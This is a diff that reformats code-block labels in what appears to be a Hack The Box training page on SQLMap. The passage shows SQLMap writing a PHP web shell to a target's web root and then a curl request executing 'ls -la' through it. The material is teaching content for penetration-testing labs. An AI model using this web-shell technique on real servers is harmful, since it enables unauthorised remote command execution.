@@ -2004,12 +2004,12 @@ do you want confirmation that the local file 'shell.php' has been successfully w
 
 We see that SQLMap confirmed that the file was indeed written:
 
-        shellsession
+shell
 `[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)`
 
 Now, we can attempt to access the remote PHP shell, and execute a sample command:
 
-        shellsession
+shell
 `adampueman@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la total 148 drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 . drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 .. -rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php ...SNIP...`
 
 We see that our PHP shell was indeed written on the remote server, and that we do have command execution over the host server.
